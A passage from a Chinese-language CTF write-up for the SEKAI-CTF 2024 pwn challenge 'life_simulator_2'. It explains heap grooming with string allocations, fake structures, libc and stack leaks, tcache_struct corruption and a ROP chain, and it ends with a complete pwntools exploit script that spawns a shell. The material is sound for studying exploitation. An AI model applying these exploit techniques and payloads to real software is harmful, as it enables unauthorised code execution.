+<p>通过 string 伪造 company 似乎没用（因为 worker 相关的函数直接与 project 绑定）。</p>
+<p>攻击 <code> std::string</code>：字符串太长时会在堆上创建。如果申请的 company 名字太长，就会先申请一个堆块存放 company，再申请另一个堆块存放字符串——而存放字符串的 chunk 正好对应原来 worker 的 project。但 add 过程中会在堆上申请很多字符串缓冲区（大约三个：company 之前一个，company 之后两个），大小为字符串长度 + 0x10。所以需要提前做好准备。</p>
+<pre><code class="language-c">Allocated chunk | PREV_INUSE
+Addr: 0x5b81513c76b0  //add后被free
+Size: 0x40 (with flag bits: 0x41)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x5b81513c76f0
+Size: 0x50 (with flag bits: 0x51)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x5b81513c7740   //add后被free
+Size: 0x40 (with flag bits: 0x41)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x5b81513c7780
+Size: 0x40 (with flag bits: 0x41)
+</code></pre>
+<p>用 0x50 时，会连续申请四个大小为 0x50 的 chunk；第二个是 company，第四个是字符串的。</p>
+<p>进入 add 之前：</p>
+<pre><code class="language-bash">要使得0x5b35e9aef6c0被string覆盖，但由于一开始会申请一个0x50的缓冲区，然后分配company，导致0x5b35e9aef6c0 没有被覆盖为company
+ 
+0x50 [  3]: 0x5b35e9aee600 —▸ 0x5b35e9aef6c0 —▸ 0x5b35e9aef850 ◂— 0
+
+Allocated chunk | PREV_INUSE
+Addr: 0x5b35e9af05c0
+Size: 0x50 (with flag bits: 0x51)
+
+add结束后
+
+pwndbg&gt; tele 0x5b35e9aee600 
+00:0000│  0x5b35e9aee600 ◂— 0x5b305af062be
+01:0008│  0x5b35e9aee608 ◂— 0x9d6f99e477f2dda3
+02:0010│  0x5b35e9aee610 ◂— &#39;llllllllllllllllllllllllllllllllllllllllllllllll&#39;
+... ↓     5 skipped
+pwndbg&gt; tele 0x5b35e9aef850 
+00:0000│  0x5b35e9aef850 ◂— 0x5b35e9aef
+01:0008│  0x5b35e9aef858 ◂— 0x9d6f99e477f2dda3
+02:0010│  0x5b35e9aef860 ◂— &#39;llllllllllllllllllllllllllllllllllllllllllllllll&#39;
+... ↓     5 skipped
+pwndbg&gt; tele 0x5b35e9af05c0
+00:0000│  0x5b35e9af05c0 ◂— 0xa30 /* &#39;0\n&#39; */
+01:0008│  0x5b35e9af05c8 ◂— 0x51 /* &#39;Q&#39; */
+02:0010│  0x5b35e9af05d0 ◂— &#39;llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll&#39;
+... ↓     5 skipped
+
+</code></pre>
+<p>可以用下面的布局解决：</p>
+<pre><code class="language-bash">add_company(b&quot;wait1 &quot;,str(1200).encode())
+add_company(b&quot;wait2 &quot;,str(1200).encode())
+add_company(b&quot;wait3 &quot;,str(1200).encode())
+add_company(b&quot;wait4 &quot;,str(1200).encode())
+
+sell_company(b&quot;wait3 &quot;) 
+sell_company(b&quot;wait2 &quot;) 
+sell_company(b&quot;wait1 &quot;)   
+sell_company(b&quot;wait4 &quot;)   
+</code></pre>
+<p><del>然后在堆上找找有没有残留的 libc 地址或栈地址，把 company 挪到那里的某个偏移处，再用 worker_info 泄露</del>——我真蠢。突然想到：直接申请一个字符串 chunk 能进入 unsorted bin 的 company 就行了。</p>
+<p>但坏消息是，按下面的布局，<code>0x64985160e6c0 </code> 会被释放，导致原来的字符串被一些更大的地址占据，所以要确保 <code>0x64985160e6c0 </code> 是最后一个。</p>
+<pre><code class="language-bash">#0x50 [  3]: 0x64985160d600 —▸ 0x64985160e6c0 —▸ 0x64985160e850 ◂— 0
+
+#0x50 [  4]: 0x64985160f5c0 —▸ 0x64985160d600 —▸ 0x64985160e6c0 —▸ 0x64985160e850 ◂— 0
+
+pwndbg&gt; tele 0x5be0f554e6c0
+00:0000│  0x5be0f554e6c0 ◂— 0x5be0f554e
+01:0008│  0x5be0f554e6c8 ◂— 0x18ebbc21ea61c452
+02:0010│  0x5be0f554e6d0 ◂— 0x6c6c6c6c6c6c6c6c (&#39;llllllll&#39;)
+... ↓     4 skipped
+07:0038│  0x5be0f554e6f8 —▸ 0x5be0f55504a0 ◂— 0
+</code></pre>
+<p>但它仍然不满足 project 头部字符串对象的格式。不过我们可以构造一个——直接照着复制一份过来就行——然后把头部的字符串地址设为要泄露 libc 的地址。再把 company 设成一个已存在的 company，以避免 company 访问和字符串对象出问题。</p>
+<pre><code class="language-bash">pwndbg&gt; tele 0x584af5e746c0  12
+00:0000│  0x584af5e746c0 ◂— 0x6c6c6c6c6c6c6c6c (&#39;llllllll&#39;)
+... ↓     6 skipped
+07:0038│  0x584af5e746f8 —▸ 0x584af5e764a0 ◂— 0
+</code></pre>
+<p>但麻烦的是只有字符串长度为 0x47 时才会分配 0x50 的 chunk——0x48 就不行——所以 company 的低字节也不行。不过只需要 7 个字节，因为堆地址只有 6 个字节。呼。</p>
+<p>可恶，忘了可以把它 free 回去再申请出来，重新修改 company 和 project……结果构造了两次……</p>
+<p>剩下的部分，一开始想用 ROP 劫持，却找不到可以打的点；有一个写堆地址的地方我以为没用……</p>
+<p>问了 tplus 师傅——太强了：写堆地址 -&gt; 任意地址写堆地址 -&gt; 写 tcache_struct -&gt; fd 指到栈上构造 ROP。</p>
+<p>由于 worker 无法伪造——这里 worker 的前八个字节是字符串的地址——所以字符串也要弄大一点，然后让字符串内容包含栈地址，这样就出来了。</p>
+<p>关系如下图所示：
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20SEKAI-CTF%20(nolibc%20speedpwn%20life_simulator_2)/assets/csdn-141507613/image-004-bffb56a241.png" alt="图片">
+move_worker 从 project1 移到 project2 时，如果 vector_begin 是 tcache_struct 上的相关地址，就会把一个堆地址写到 tcache_struct 上；然后通过该堆块的 fd 申请到栈上做 ROP。相关的伪造结构都通过申请字符串堆块来替换。</p>
+<p>注意，如果输入的字符中含有 &quot;\x20&quot; 字节，会被识别为空格，从而导致出错。</p>
+<h2 id="vector-插入逻辑">vector 插入逻辑</h2>
+<pre><code class="language-c">__int64 __fastcall std::vector&lt;Worker *&gt;::emplace_back&lt;Worker *&amp;&gt;(__int64 a1, __int64 a2)
+{
+  __int64 v2; // rax
+  __int64 v3; // rax
+  __int64 v4; // rbx
+  __int64 v5; // rax
+  __int64 v7; // [rsp+20h] [rbp-20h]
+
+  if ( *(_QWORD *)(a1 + 8) == *(_QWORD *)(a1 + 16) )
+  {
+    v4 = std::forward&lt;Worker *&amp;&gt;(a2);
+    v5 = std::vector&lt;Worker *&gt;::end(a1);
+    std::vector&lt;Worker *&gt;::_M_realloc_insert&lt;Worker *&amp;&gt;(a1, v5, v4);
+  }
+  else
+  {
+    v2 = std::forward&lt;Worker *&amp;&gt;(a2);
+    v7 = *(_QWORD *)(a1 + 8);
+    v3 = std::forward&lt;Worker *&amp;&gt;(v2);
+    std::construct_at&lt;Worker *,Worker *&amp;&gt;(v7, v3);
+    *(_QWORD *)(a1 + 8) += 8LL;
+  }
+  return std::vector&lt;Worker *&gt;::back(a1);
+}
+</code></pre>
+<h3 id="1-函数参数">1. 函数参数</h3>
+<ul>
+<li><code>a1</code>：<code>std::vector&lt;Worker*&gt;</code> 对象的地址。</li>
+<li><code>a2</code>：<code>Worker*</code> 类型的引用，表示要插入到 <code>std::vector</code> 中的指针。</li>
+</ul>
+<h3 id="2-局部变量">2. 局部变量</h3>
+<ul>
+<li><code>v2</code>、<code>v3</code>、<code>v4</code>、<code>v5</code>：中间变量，通常用于存储计算结果。</li>
+<li><code>v7</code>：用于存储 <code>std::vector</code> 当前末尾元素的地址。</li>
+</ul>
+<h3 id="3-逻辑分析">3. 逻辑分析</h3>
+<pre><code class="language-cpp">if ( *(_QWORD *)(a1 + 8) == *(_QWORD *)(a1 + 16) )
+</code></pre>
+<ul>
+<li><code>a1 + 8</code>：指向 <code>std::vector</code> 容器的当前末尾（即第一个空闲位置）。</li>
+<li><code>a1 + 16</code>：指向 <code>std::vector</code> 容器容量的末尾（即容量上限位置）。</li>
+</ul>
+<p>这一行检查 <code>std::vector</code> 是否已满（即当前元素个数是否等于容量）。如果已满，就进入重新分配逻辑；否则直接在当前末尾插入元素。</p>
+<h3 id="4-重新分配逻辑">4. 重新分配逻辑</h3>
+<pre><code class="language-cpp">v4 = std::forward&lt;Worker *&amp;&gt;(a2);
+v5 = std::vector&lt;Worker *&gt;::end(a1);
+std::vector&lt;Worker *&gt;::_M_realloc_insert&lt;Worker *&amp;&gt;(a1, v5, v4);
+</code></pre>
+<ul>
+<li><code>v4</code>：使用 <code>std::forward</code> 转发 <code>a2</code>，即要插入的 <code>Worker*</code> 指针。</li>
+<li><code>v5</code>：调用 <code>std::vector&lt;Worker*&gt;::end()</code> 获取 <code>std::vector</code> 的末尾迭代器，指向当前要插入元素的位置。</li>
+<li><code>_M_realloc_insert</code>：<code>std::vector</code> 的内部函数，用于在重新分配时执行插入。它会重新分配一块更大的内存，然后把旧数据和新数据复制到新内存中。</li>
+</ul>
+<h3 id="5-直接插入逻辑">5. 直接插入逻辑</h3>
+<pre><code class="language-cpp">v2 = std::forward&lt;Worker *&amp;&gt;(a2);
+v7 = *(_QWORD *)(a1 + 8);
+v3 = std::forward&lt;Worker *&amp;&gt;(v2);
+std::construct_at&lt;Worker *,Worker *&amp;&gt;(v7, v3);
+*(_QWORD *)(a1 + 8) += 8LL;
+</code></pre>
+<ul>
+<li><code>v2</code>：使用 <code>std::forward</code> 转发 <code>a2</code>，得到要插入的 <code>Worker*</code> 指针。</li>
+<li><code>v7</code>：获取 <code>std::vector</code> 当前末尾的地址（即插入位置）。</li>
+<li><code>v3</code>：再次通过 <code>std::forward</code> 处理 <code>v2</code>，得到 <code>Worker*</code> 指针。</li>
+<li><code>std::construct_at</code>：在地址 <code>v7</code> 处构造一个新的 <code>Worker*</code>，即把新的 <code>Worker*</code> 插入到 <code>std::vector</code> 的末尾。</li>
+<li><code>*(_QWORD *)(a1 + 8) += 8LL</code>：更新 <code>std::vector</code> 的末尾指针，使其指向下一个空闲位置。</li>
+</ul>
+<h3 id="6-返回值">6. 返回值</h3>
+<pre><code class="language-cpp">return std::vector&lt;Worker *&gt;::back(a1);
+</code></pre>
+<ul>
+<li>最后，函数返回 <code>std::vector&lt;Worker*&gt;</code> 容器的最后一个元素（即刚刚插入的元素）。</li>
+</ul>
+<p>最后可以对一个 worker 实现 UAF，然后直接改 fd 就行。或者找两个相邻的 worker，都写进 tcache_struct，把第一个申请出来，利用 size 越界写把仍在 tcache_struct 中的相邻 worker 的 fd 改成加密后的栈地址。<del>太麻烦了——下次也许可以试着出一道根本拿不到 worker UAF 的题来折磨别人</del> </p>
+<h2 id="exp-2">exp</h2>
+<pre><code class="language-python">from pwn import *
+p=process(&quot;./pwn&quot;)
+
+
+def add_company(company_name,budget):
+    p.sendline(b&quot;add_company &quot;+company_name+budget)
+
+
+def sell_company(company_name):
+    p.sendline(b&quot;sell_company &quot;+company_name) 
+
+def add_project(company_name,project_name,project_profit_per_week):
+    p.sendlineafter(b&quot;INFO: Success&quot;,b&quot;add_project &quot;+company_name+project_name+project_profit_per_week)
+
+def remove_project(company_name,project_name):
+    p.sendline(b&quot;add_project &quot;+company_name+project_name)
+
+def hire_worker(company_name,project_name,worker_name,salary):
+    p.sendlineafter(b&quot;INFO: Success&quot;,b&quot;hire_worker &quot;+company_name+project_name+worker_name+b&quot; &quot;+salary)
+
+def fire_worker(worker_name):
+    p.sendline(b&quot;fire_worker &quot;+worker_name)
+
+def move_worker(worker_name,new_project_name):
+    p.sendline(b&quot;move_worker &quot;+worker_name+new_project_name)
+
+def worker_info(worker_name):
+    p.sendline(b&quot;worker_info &quot;+worker_name)
+
+def elapse_week():
+    p.sendline(b&quot;elapse_week &quot;)
+
+# context(os=&quot;linux&quot;,arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)
+
+p.sendline(b&quot;add_company &quot;+b&quot;llk &quot;+str(1200).encode())
+
+
+add_project(b&quot;llk &quot;,b&quot;pwn &quot;,b&quot;1000000 &quot;)
+
+for i in range(40):
+    hire_worker(b&quot;llk &quot;,b&quot;pwn &quot;,str(i).encode(),str(30).encode())
+
+elapse_week()
+
+
+
+sell_company(b&quot;llk &quot;)
+
+add_company(b&quot;llk1 &quot;,str(1200).encode())
+add_company(b&quot;llk2 &quot;,str(1200).encode())
+add_project(b&quot;llk2 &quot;,b&quot;pwn &quot;,b&quot;1000000 &quot;)
+
+worker_info(str(1).encode())
+
+p.recvuntil(b&quot;Project workers count: &quot;)
+heap=(int(p.recvuntil(b&quot;\n&quot;)[:-1].decode(&#39;ascii&#39;))&lt;&lt;3)-0x13370
+print(&quot;leak heap&quot;,hex(heap))
+
+
+
+add_company(b&quot;llk3 &quot;,str(1200).encode())
+
+add_project(b&quot;llk3 &quot;,b&quot;pwn &quot;,b&quot;1000000 &quot;)
+
+for i in range(40):
+    hire_worker(b&quot;llk3 &quot;,b&quot;pwn &quot;,str(i+40).encode(),str(30).encode())
+
+
+elapse_week()
+
+
+
+sell_company(b&quot;llk3 &quot;)
+
+
+# for tcache
+#0x50 [  3]: 0x584af5e73600 —▸ 0x584af5e746c0 —▸ 0x584af5e74850 ◂— 0
+
+
+
+add_company(b&quot;wait1 &quot;,str(1200).encode())
+add_company(b&quot;wait2 &quot;,str(1200).encode())
+add_company(b&quot;wait3 &quot;,str(1200).encode())
+add_company(b&quot;wait4 &quot;,str(1200).encode())
+
+#0x50 [  4]: 0x584af5e755c0 —▸ 0x584af5e73600 —▸ 0x584af5e74850 —▸ 0x584af5e746c0 ◂— 0
+
+sell_company(b&quot;wait2 &quot;) 
+sell_company(b&quot;wait3 &quot;) 
+sell_company(b&quot;wait1 &quot;)   
+sell_company(b&quot;wait4 &quot;)   
+
+
+target_leak_libc_chunk=heap+0x164a0+0X20+0x10
+payload=p64(target_leak_libc_chunk)+p64(0x40)+p64(0x40)+p64(0x13580+heap)+b&quot;0&quot;*0x20
+fake_project=payload+p64(heap+0x13600)[:6]
+add_company(fake_project+b&quot; &quot;,str(1200).encode())
+
+
+add_company(b&quot;l&quot;*0x400+b&quot; &quot;,str(1200).encode())
+
+
+
+
+worker_info(str(41).encode())
+p.recvuntil(b&quot;Project name: &quot;)
+libc=u64(p.recv(6).ljust(8,b&quot;\x00&quot;))-0x203b20
+print(&quot;leak libc&quot;,hex(libc))
+
+
+sell_company(fake_project+b&quot; &quot;)
+
+add_company(b&quot;get_money &quot;,str(1200).encode())
+add_project(b&quot;get_money &quot;,b&quot;money &quot;,b&quot;1000000 &quot;)
+
+for i in range(0x10):
+    elapse_week()
+
+
+sell_company(b&quot;get_money &quot;)
+
+
+add_company(b&quot;wait1 &quot;,str(1200).encode())
+add_company(b&quot;wait2 &quot;,str(1200).encode())
+add_company(b&quot;wait3 &quot;,str(1200).encode())
+add_company(b&quot;wait4 &quot;,str(1200).encode())
+
+
+sell_company(b&quot;wait3 &quot;) 
+sell_company(b&quot;wait1 &quot;)  
+sell_company(b&quot;wait2 &quot;)  
+sell_company(b&quot;wait4 &quot;)   
+
+
+
+
+environ=libc+0x20ad58
+target_leak_libc_chunk=environ
+payload=p64(target_leak_libc_chunk)+p64(0x40)+p64(0x40)+p64(0x13580+heap)+b&quot;0&quot;*0x20
+fake_project=payload+p64(heap+0x13600)[:6]
+add_company(fake_project+b&quot; &quot;,str(1200).encode())
+worker_info(str(41).encode())
+p.recvuntil(b&quot;Project name: &quot;)
+stack=u64(p.recv(6).ljust(8,b&quot;\x00&quot;))-0x138
+print(&quot;leak stack&quot;,hex(stack))
+
+
+
+# sell_company(fake_project+b&quot; &quot;)
+# #0x50 [  4]: 0x5caac3a18530 —▸ 0x5caac3a15600 —▸ 0x5caac3a166c0 —▸ 0x5caac3a16850 ◂— 0
+
+# add_company(b&quot;wait1 &quot;,str(1200).encode())
+# add_company(b&quot;wait2 &quot;,str(1200).encode())
+# add_company(b&quot;wait3 &quot;,str(1200).encode())
+# add_company(b&quot;wait4 &quot;,str(1200).encode())
+
+
+# sell_company(b&quot;wait3 &quot;) 
+# sell_company(b&quot;wait1 &quot;)  
+# sell_company(b&quot;wait2 &quot;)  
+# sell_company(b&quot;wait4 &quot;)   
+
+
+
+# arbitary address write heap
+add_company(b&quot;llk4 &quot;,str(1200).encode())
+
+add_project(b&quot;llk4 &quot;,b&quot;pwn &quot;,b&quot;1000000 &quot;)
+
+for i in range(40):
+    hire_worker(b&quot;llk4 &quot;,b&quot;pwn &quot;,str(i+80).encode(),str(30).encode())
+
+
+hire_worker(b&quot;llk4 &quot;,b&quot;pwn &quot;,p64(stack)+0x28*b&quot;k&quot;,str(0).encode())
+
+elapse_week()
+
+sell_company(b&quot;llk4 &quot;)
+
+#0x50 [  3]: 0x5fc4408c4530 —▸ 0x5fc4408c2850 —▸ 0x5fc4408c46c0 ◂— 0
+
+add_company(b&quot;wait1 &quot;,str(1200).encode())
+add_company(b&quot;wait2 &quot;,str(1200).encode())
+add_company(b&quot;wait3 &quot;,str(1200).encode())
+add_company(b&quot;wait4 &quot;,str(1200).encode())
+
+#0x50 [  4]: 0x584af5e755c0 —▸ 0x584af5e73600 —▸ 0x584af5e74850 —▸ 0x584af5e746c0 ◂— 0
+
+sell_company(b&quot;wait2 &quot;) 
+sell_company(b&quot;wait3 &quot;) 
+sell_company(b&quot;wait1 &quot;)   
+sell_company(b&quot;wait4 &quot;)   
+
+p.recv(timeout=5)
+
+
+
+# cober fake project 1 , it need fake workers vector  and fake company
+payload=p64(0x18090+heap)+p64(0x1d)+p64(0x1e)+p64(0x13580+heap)+b&quot;0&quot;*0x8+p64(heap+0x13550)+p64(heap+0x13558)+p64(heap+0x13558)
+fake_project_1=payload+p64(heap+0x17ec0)[:6]  
+add_company(fake_project_1+b&quot; &quot;,str(1001).encode())  
+
+# fake project 1&#39;s  fake workers vector 
+fake_project_1_fake_workers_vector=( p64(heap+0x17c60) ).ljust(0x20,b&quot;a&quot;) 
+add_company(fake_project_1_fake_workers_vector+b&quot; &quot;,str(1002).encode())  
+
+
+#  fake company&#39;s fake vector project
+fake_vector_project=(p64(0)+p64(0)+p64(heap+0x14850)+p64(heap+0x18010)).ljust(0x20,b&quot;a&quot;)
+add_company(fake_vector_project+b&quot; &quot;,str(1003).encode())  
+
+
+
+
+
+# fake project 1&#39;s  fake company
+payload=p64(target_leak_libc_chunk)+p64(0x40)+p64(0x40)+p64(0x13580+heap)+b&quot;0&quot;*0x10
+fake_company=p64(0)+p64(0)+payload+p64(heap+0x13530)+p64(heap+0x13540)+p64(heap+0x13540)
+add_company(fake_company+b&quot; &quot;,str(1004).encode())  
+
+
+
+context(os=&quot;linux&quot;,arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)
+# fake project 2   ,will construt vector as tcache_struct 
+payload=p64(0x18060+heap)+p64(0x1d)+p64(0x1e)+p64(0x13580+heap)+b&quot;0&quot;*0x8+p64(0x100+heap)+p64(0x108+heap)+p64(0x110+heap)
+fake_project_2=payload+p64(heap+0x17ec0)[:6]  
+add_company(fake_project_2+b&quot; &quot;,str(1005).encode()) 
+
+# fake project 2  string name
+add_company(b&quot;project_2_project_2_name_name &quot;,str(1006).encode())
+# fake project 1  string name
+add_company(b&quot;project_1_project_1_name_name &quot;,str(1006).encode())
+# fake company string name
+add_company(b&quot;company_name_company_name &quot;,str(1006).encode())
+
+
+
+
+# add_company(p64(stack)+p64(0),str(1007).encode())  
+
+# add_company(p64(0),str(1007).encode()) # padding
+# add_company(p64(0),str(1007).encode()) # padding
+
+add_company(b&quot;a&quot;*0x100+b&quot; &quot;,str(1007).encode()) # padding
+add_company(b&quot;b&quot;*0x100+b&quot; &quot;,str(1007).encode()) # padding
+
+
+add_company(b&quot;a&quot;*0x30+b&quot; &quot;,str(1007).encode()) # padding 0x40
+
+
+
+move_worker(p64(stack)+0x28*b&quot;k&quot;+b&quot; &quot;,b&quot;project_2_project_2_name_name &quot;)
+
+gdb.attach(p)
+
+
+
+
+fire_worker(p64(stack)+0x28*b&quot;k&quot;+b&quot; &quot;)
+
+
+sell_company(b&quot;a&quot;*0x30)
+
+
+
+payload=(p64(stack-0x10^((heap+0x17000)&gt;&gt;12))).ljust(0x30,b&quot;a&quot;)
+
+add_company(payload+b&quot; &quot;,str(1007).encode())
+
+sell_company(b&quot;a&quot;*0x100)
+sell_company(b&quot;b&quot;*0x100)
+pop_rdi_ret=libc+0x000000000010f75b
+system=libc+0x58740
+bin_sh=libc+0x1cb42f
+ret=libc+0x000000000002882f
+payload=(p64(0)+p64(0)+p64(0)+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)).ljust(0x100,b&quot;\x00&quot;)
+add_company(payload+b&quot; &quot;,str(1008).encode())
+
+p.send(b&quot;\n&quot;)
+p.interactive()
+
+</code></pre>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20SEKAI-CTF%20(nolibc%20speedpwn%20life_simulator_2)/assets/csdn-141507613/image-005-e445cf43ac.png" alt="图片"></p>
+
+    </article>
+    
+    <nav class="pn"><a href="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20IRIS%20CTF-PWN-%5Binsanity-check%5D/"><span class="l">上一篇</span>2024 IRIS CTF-PWN-[insanity-check]</a><a href="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20WMCTF-PWN%20%E9%A2%98%E8%A7%A3%EF%BC%88BlindVM%E3%80%81babysigin%E3%80%81evm%E3%80%81magicpp%EF%BC%89/"><span class="l">下一篇</span>2024 WMCTF-PWN 题解（BlindVM、babysigin、evm、magicpp）</a></nav>
+  </main>
+  <aside class="toc"><div class="toc-h">目录</div><a class="d2" href="#exp">exp</a><a class="d2" href="#exp-1">exp</a><a class="d2" href="#委托构造函数">委托构造函数</a><a class="d3" href="#委托构造函数的语法">委托构造函数的语法</a><a class="d3" href="#解释">解释</a><a class="d2" href="#stdremove-和-stderase">std:remove 和 std:erase</a><a class="d3" href="#代码解释">代码解释</a><a class="d3" href="#原理">原理</a><a class="d3" href="#内存管理注意事项">内存管理注意事项</a><a class="d2" href="#思路">思路</a><a class="d3" href="#1-背景">1. 背景</a><a class="d3" href="#2-示例代码">2. 示例代码</a><a class="d3" href="#3-解释">3. 解释</a><a class="d2" href="#vector-插入逻辑">vector 插入逻辑</a><a class="d3" href="#1-函数参数">1. 函数参数</a><a class="d3" href="#2-局部变量">2. 局部变量</a><a class="d3" href="#3-逻辑分析">3. 逻辑分析</a><a class="d3" href="#4-重新分配逻辑">4. 重新分配逻辑</a><a class="d3" href="#5-直接插入逻辑">5. 直接插入逻辑</a><a class="d3" href="#6-返回值">6. 返回值</a><a class="d2" href="#exp-2">exp</a></aside>
+</div>
+<script type="module" src="/blog/article.js"></script>
+</body>
+</html>
